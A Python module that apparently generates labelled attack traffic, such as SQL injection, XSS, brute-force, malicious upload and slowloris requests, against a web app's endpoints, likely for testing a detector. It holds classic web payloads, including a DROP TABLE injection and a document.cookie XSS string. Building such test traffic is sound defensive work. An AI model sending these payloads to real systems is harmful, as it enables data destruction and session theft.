import random
def get_sql_injection_attack(base_url):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' UNION SELECT * FROM users--"
    ]
    return {
        'url': f"{base_url}/submit_message",
        'method': 'POST',
        'data': {'manual_message': random.choice(payloads)},
        'headers': {'X-ATTACK-TYPE': 'SQLI'}
    }

def get_xss_attack(base_url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)"
    ]
    return {
        'url': f"{base_url}/submit_message",
        'method': 'POST',
        'data': {'manual_message': random.choice(payloads)},
        'headers': {'X-ATTACK-TYPE': 'XSS'}
    }

def get_brute_force_attack(base_url):
    return {
        'url': f"{base_url}/{random.choice(['process_new', 'decryption'])}",
        'method': 'POST' if random.random() > 0.5 else 'GET',
        'data': {'dummy': 'A'*10000},
        'headers': {'X-ATTACK-TYPE': 'BRUTE', 'User-Agent': 'MALICIOUS-BOT'}
    }

def get_malicious_file_attack(base_url):
    return {
        'url': f"{base_url}/upload_file",
        'method': 'POST',
        'files': {'file': ('exploit.exe', b'MZ\x90\x00\x03...')},
        'headers': {'X-ATTACK-TYPE': 'MALFILE'}
    }

def get_slowloris_attack(base_url):
    return {
        'url': base_url,
        'method': 'GET',
        'headers': {
            'X-ATTACK-TYPE': 'SLOWLORIS',
            'User-Agent': 'MALICIOUS-SLOWLORIS',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Keep-Alive': '900'
        },
        'timeout': 30
    }